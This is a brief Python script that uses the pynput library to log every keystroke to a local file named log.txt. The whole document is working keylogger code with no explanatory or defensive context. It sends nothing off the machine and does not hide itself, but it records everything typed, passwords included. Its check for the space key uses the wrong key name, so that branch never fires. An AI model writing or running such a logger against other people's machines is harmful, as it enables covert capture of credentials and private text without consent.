from pynput.keyboard import Listener

#Listeners - listens to keystrokes

def writetofile(key):
    keydata = str(key)
    keydata = keydata.replace("'","")
    
    if keydata == 'Key.Space':
        keydata = ''
        
    with open("log.txt", 'a') as f:
        f.write(keydata)

with Listener (on_press=writetofile) as l:
    l.join()
    
    
  